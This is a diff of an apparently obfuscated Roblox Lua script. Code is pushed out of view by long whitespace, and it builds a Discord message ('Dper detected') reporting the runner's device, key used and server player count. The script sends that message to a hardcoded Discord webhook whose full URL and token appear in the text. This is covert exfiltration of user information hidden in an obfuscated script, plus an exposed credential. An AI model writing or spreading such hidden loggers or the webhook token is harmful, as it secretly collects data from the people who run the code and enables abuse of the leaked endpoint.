@@ -227,6 +227,9 @@ local a=string.byte;local Y=string.char;local n=string.sub;local L=table.concat;
                                                                                                                                                                                                                                       local plrs = game.Players:GetPlayers()
 
 
+local plrs = game.Players:GetPlayers()
+local key_used = "no key"
+
 local data = {
 	["content"] = "Dper detected",
 	["tts"] = false,
@@ -261,7 +264,7 @@ local data = {
 			["inline"] = true
 		}, {
 			["name"] = "Device :",
-			["value"] = deviced,
+			["value"] = "cant anymore",
 			["inline"] = true
 		}, {
 			["name"] = "Number of players in the server :",
@@ -288,3 +291,4 @@ local function sendmsg(webhook)
 			["Headers"] = {["content-type"] = "application/json"}})
 end
 sendmsg("https://discord.com/api/webhooks/1045818045785980938/6Fscx2pKxUyPalvxfwCy05l93p3UN97W3Ov0SSmay6fmoWHeruEBZiPXkQs0UflmKyHc")
+
